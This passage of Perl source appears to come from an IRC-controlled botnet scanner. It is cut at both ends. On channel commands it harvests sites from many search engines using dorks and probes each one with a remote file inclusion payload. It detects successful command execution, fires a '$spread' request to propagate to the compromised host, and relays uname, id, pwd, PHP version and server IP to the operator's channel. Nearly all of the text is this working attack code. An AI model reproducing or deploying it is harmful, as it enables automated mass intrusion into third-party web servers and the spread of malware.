my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}
}
}}}
exit;
}}

if ($line=~ /PRIVMSG $canale :$stringa\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
	my @gigablastlist=&gigablast($dork);
push(my @tot, @gigablastlist);
my @puliti=&unici(@tot);
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3[9Area513]  7,1Gigablast15 Carregando... ");

stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Gigablast15 Total Encontrado:15 ".scalar(@tot)." 0Sites!");
stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Gigablast15 Total Cleaned:4  ".scalar(@puliti)." 0Sites!");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){ 
}
if ($contatore==$uni-1){
stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Gigablast15 Terminado 0para:$bug $dork");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /ALBANIA/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);

my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);

stampa($sk, "PRIVMSG $adm :14,1@**1412,19 Safe Mode15:4,1Off 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Safe Mode15:4,1Off 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 up da15 $alb2 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 id15 $alb3 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 pwd15 $alb4 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb5 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 PHPV15 $alb6 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 IP15 $alb7 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Server15 $alb8 9**@");
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3-------------------------------------14,13 0,1 489141414 3");
}
}
elsif($re =~ /ALBANIA/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);

stampa($sk, "PRIVMSG $adm :14,1@**1412,19 Safe Mode15:4,1ON 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Safe Mode15:4,1ON 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 up da15 $alb2 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 id15 $alb3 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 pwd15 $alb4 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb5 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 PHPV15 $alb6 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 IP15 $alb7 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Server15 $alb8 9**@");
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3-------------------------------------14,13 0,1 489141414 3");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}
}
}}}
exit;
}}

if ($line=~ /PRIVMSG $canale :$stringa\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
	my @fireball=&fireball($dork);
push(my @tot, @fireball);
my @puliti=&unici(@tot);
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3[9Area513]  7,1Fireball15 Carregando... ");

stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Fireball15 Total Encontrado:15 ".scalar(@tot)." 0Sites!");
stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Fireball15 Total Cleaned:4  ".scalar(@puliti)." 0Sites!");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){ 
}
if ($contatore==$uni-1){
stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Fireball15 Terminado 0para:$bug - $dork");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /ALBANIA/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);

my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);

stampa($sk, "PRIVMSG $adm :14,1@**1412,19 Safe Mode15:4,1Off 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Safe Mode15:4,1Off 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 up da15 $alb2 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 id15 $alb3 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 pwd15 $alb4 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb5 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 PHPV15 $alb6 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 IP15 $alb7 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Server15 $alb8 9**@");
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3-------------------------------------14,13 0,1 489141414 3");
}
}
elsif($re =~ /ALBANIA/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);

stampa($sk, "PRIVMSG $adm :14,1@**1412,19 Safe Mode15:4,1ON 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Safe Mode15:4,1ON 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 up da15 $alb2 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 id15 $alb3 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 pwd15 $alb4 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb5 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 PHPV15 $alb6 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 IP15 $alb7 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Server15 $alb8 9**@");
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3-------------------------------------14,13 0,1 489141414 3");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}
}
}}}
exit;
}}

if ($line=~ /PRIVMSG $canale :$stringa\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
	my @webdelist=&web($dork);
push(my @tot, @webdelist);
my @puliti=&unici(@tot);
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3[9Area513]  7,1WebDe15 Carregando... ");

stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1WebDe15 0Total Encontrado:15 ".scalar(@tot)." 0Sites!");
stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1WebDe15 0Total Cleaned:4  ".scalar(@puliti)." 0Sites!");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){ 
}
if ($contatore==$uni-1){
stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1WebDe15 0 Terminado 0para:$bug $dork");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /ALBANIA/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);

my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);

stampa($sk, "PRIVMSG $adm :14,1@**1412,19 Safe Mode15:4,1Off 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Safe Mode15:4,1Off 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 up da15 $alb2 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 id15 $alb3 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 pwd15 $alb4 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb5 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 PHPV15 $alb6 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 IP15 $alb7 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Server15 $alb8 9**@");
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3-------------------------------------14,13 0,1 489141414 3");
}
}
elsif($re =~ /ALBANIA/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);

stampa($sk, "PRIVMSG $adm :14,1@**1412,19 Safe Mode15:4,1ON 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Safe Mode15:4,1ON 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 up da15 $alb2 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 id15 $alb3 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 pwd15 $alb4 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb5 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 PHPV15 $alb6 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 IP15 $alb7 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Server15 $alb8 9**@");
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3-------------------------------------14,13 0,1 489141414 3");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}
}
}}}
exit;
}}

if ($line=~ /PRIVMSG $canale :$stringa\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
	my @sclist=&search($dork);
	my @schlist=&searchcom($dork);
push(my @tot, @sclist,@schlist);
my @puliti=&unici(@tot);
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3[9Area513]  7,1Search15 Carregando... ");

stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Search15 Total Encontrado:15 ".scalar(@tot)." 0Sites!");
stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Search15 Total Cleaned:4  ".scalar(@puliti)." 0Sites!");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){ 
}
if ($contatore==$uni-1){
stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Search15 Terminado 0para:$bug $dork");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /ALBANIA/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);

my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);

stampa($sk, "PRIVMSG $adm :14,1@**1412,19 Safe Mode15:4,1Off 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Safe Mode15:4,1Off 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 up da15 $alb2 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 id15 $alb3 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 pwd15 $alb4 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb5 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 PHPV15 $alb6 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 IP15 $alb7 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Server15 $alb8 9**@");
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3-------------------------------------14,13 0,1 489141414 3");
}
}
elsif($re =~ /ALBANIA/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);

stampa($sk, "PRIVMSG $adm :14,1@**1412,19 Safe Mode15:4,1ON 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Safe Mode15:4,1ON 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 up da15 $alb2 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 id15 $alb3 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 pwd15 $alb4 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb5 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 PHPV15 $alb6 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 IP15 $alb7 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Server15 $alb8 9**@");
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3-------------------------------------14,13 0,1 489141414 3");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}
}
}}}
exit;
}}

if ($line=~ /PRIVMSG $canale :$stringa\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
	my @hotb=&hotbot($dork);
push(my @tot, @hotb);
my @puliti=&unici(@tot);
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3[9Area513]  7,1HotBot15 Carregando... ");

stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1HotBot15 Total Encontrado:15 ".scalar(@tot)." 0Sites!");
stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1HotBot15 Total Cleaned:4  ".scalar(@puliti)." 0Sites!");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){ 
}
if ($contatore==$uni-1){
stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1HotBot15 Terminado 0para:$bug $dork");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /ALBANIA/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);

my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);

stampa($sk, "PRIVMSG $adm :14,1@**1412,19 Safe Mode15:4,1Off 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Safe Mode15:4,1Off 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 up da15 $alb2 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 id15 $alb3 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 pwd15 $alb4 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb5 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 PHPV15 $alb6 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 IP15 $alb7 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Server15 $alb8 9**@");
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3-------------------------------------14,13 0,1 489141414 3");
}
}
elsif($re =~ /ALBANIA/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);

stampa($sk, "PRIVMSG $adm :14,1@**1412,19 Safe Mode15:4,1ON 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Safe Mode15:4,1ON 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 up da15 $alb2 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 id15 $alb3 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 pwd15 $alb4 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb5 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 PHPV15 $alb6 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 IP15 $alb7 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Server15 $alb8 9**@");
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3-------------------------------------14,13 0,1 489141414 3");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}
}
}}}
exit;
}}
if ($line=~ /PRIVMSG $canale :$stringa\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
	my @sfgatelist=&sfgate($dork);
push(my @tot, @sfgatelist);
my @puliti=&unici(@tot);
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3[9Area513]  7,1Sfgate15 Carregando... ");

stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Sfgate15 Total Encontrado:15 ".scalar(@tot)." 0Sites!");
stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Sfgate15 Total Cleaned:4  ".scalar(@puliti)." 0Sites!");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %100==0){ 
}
if ($contatore==$uni-1){
stampa($sk, "PRIVMSG $canale :14,13 -=- [9Area513]  7,1Sfgate15 Terminado 0para:$bug $dork");
}
my $test="http://".$sito.$bug.$id."?";
my $print="http://".$sito.$bug.$cmd."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /ALBANIA/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);

my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);

stampa($sk, "PRIVMSG $adm :14,1@**1412,19 Safe Mode15:4,1Off 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Safe Mode15:4,1Off 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 up da15 $alb2 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 id15 $alb3 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 pwd15 $alb4 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb5 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 PHPV15 $alb6 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 IP15 $alb7 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Server15 $alb8 9**@");
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3-------------------------------------14,13 0,1 489141414 3");
}
}
elsif($re =~ /ALBANIA/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);

stampa($sk, "PRIVMSG $adm :14,1@**1412,19 Safe Mode15:4,1ON 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Safe Mode15:4,1ON 14,1**@15 $print ");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 up da15 $alb2 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 id15 $alb3 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 pwd15 $alb4 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 $alb5 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 PHPV15 $alb6 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 IP15 $alb7 9**@");
stampa($sk, "PRIVMSG $canale :14,1@**1412,19 Server15 $alb8 9**@");
stampa($sk, "PRIVMSG $canale :14,13 0,1 489141414 3-------------------------------------14,13 0,1 489141414 3");
my $test2="http://".$sito.$bug.$spread."?";
my $reqz=HTTP::Request->new(GET=>$test2);
my $ua=LWP::UserAgent->new();
my $response=$ua->request($reqz);
}
}
}}}
exit;
}}

sub os(){
my $sito=$_[0];
my $Res=query($sito);
my $type;
my $free;
my $str;
while($Res=~m/<br>uname -a:(.+?)\<br>/g){
$alb=$1;
}
while($Res=~m/<br>uptime:(.+?)\<br>/g){
$alb2=$1;
}
while($Res=~m/<br>id:(.+?)\<br>/g){
$alb3=$1;
}
while($Res=~m/<br>pwd:(.+?)\<br>/g){
$alb4=$1;
}
while($Res=~m/<br>SoftWare:(.+?)\<br>/g){
$alb5=$1;
}
while($Res=~m/<br>PHPV:(.+?)\<br>/g){
$alb6=$1;
}
while($Res=~m/<br>ServerAddr:(.+?)\<br>/g){
$alb7=$1;
}
while($Res=~m/<br>ServerName:(.+?)\<br>/g){
$alb8=$1;
}
while($Res=~m/<br>os:(.+?)\<br>/g){
$os=$1;
}
while($Res=~m/<br>Free:(.+?)\<br>/g){
$free=$1;
}
$str=$type.",".$free;
return $str;
}


sub googlet {
my @dominios = ("net","at","be","ca","ch","de","dk","fi","fr","gr","us","it","es","se","nl","pl","pt","ru","cz","co.uk","hu","com.br");
my @country = ("AT","BE","CA","CH","DE","DK","FI","FR","GR","IE","IT","NL","PL","PT","RU","TR","UK%7CcountryGB","HU","SE","USA","CA","CZ","ES","com.br");
my @lang = ("en","es","de","nl","it","fo","sv","fr","el","ga","iw","ja","ko","lt","qu","pl","pt-BR","ru","ta","tr","zh-TW","ru","hu","com.br");
my @lst;
my $key=key($_[0]);
my $c=0;
foreach my $i (@dominios){
my @lista = google($i,$key,$lang[$c],$country[$c]);
push(@lst,@lista);
$c++;
}
return @lst;
}

sub google(){
my @lst;
my $i=$_[0];
my $key=$_[1];
my $lang= $_[2];
my $country =$_[3];
for($b=0;$b<=1000;$b+=100){
my $Go=("www.google.".$i."/search?hl=".$lang."&q=".key($key)."&num=100&start=".$b."&meta=cr%3Dcountry".$country);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub allthewebt {
my @lang = ("en","es","de","nl","pt-BR","it","de","fo","fr","sv","com.br");
my @lst;
my $key=key($_[0]);
my $c=0;
foreach my $lang (@lang){
my @lista = alltheweb($key,$lang[$c]);
push(@lst,@lista);
$c++;
}
return @lst;
}


sub alltheweb(){
my @lista;
my $key = $_[0];
my $lang= $_[1];
for($b=0;$b<=1000;$b+=100){
my $alltheweb=("http://www.alltheweb.com/search?cat=web&_sb_lang=".$lang."&hits=100&q=".key($key)."&o=".$b);
my $Res=query($alltheweb);
while($Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}


sub standard()
{
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=100)
{
my $all=("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$i);
my $Res=query($all);
while($Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}






sub yahoo(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=100){
my $Ya=("http://search.yahoo.com/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\*\*http%3a\/\/(.+?)\" >/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);}}
return @lst;}

sub yahooa(){
my @lst;
my $key = $_[0];
for($b=210;$b<=1000;$b+=210){
my $Ya=("http://fr.search.yahoo.com/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\*\*http%3a\/\/(.+?)\" >/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);}}
return @lst;}

sub yahoob(){
my @lst;
my $key = $_[0];
for($b=410;$b<=1000;$b+=210){
my $Ya=("http://nl.search.yahoo.com/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\*\*http%3a\/\/(.+?)\" >/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);}}
return @lst;}

sub yahooc(){
my @lst;
my $key = $_[0];
for($b=610;$b<=1000;$b+=210){
my $Ya=("http://at.search.yahoo.com/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\*\*http%3a\/\/(.+?)\" >/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);}}
return @lst;}

sub yahood(){
my @lst;
my $key = $_[0];
for($b=810;$b<=1000;$b+=210){
my $Ya=("http://de.search.yahoo.com/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\*\*http%3a\/\/(.+?)\" >/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
push(@lst,@grep);}}
return @lst;}


sub yahooe(){
my @lst;
my $key = $_[0];
for($b=810;$b<=1000;$b+=210){
my $Ya=("http://ca.search.yahoo.com/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=$b");
my $Res=query($Ya);
while($Res =~ m/\*\*http%3a\/\/(.+?)\" >/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
push(@lst,@grep);}}
return @lst;}

sub yahoof(){
my @lst;
my $key = $_[0];
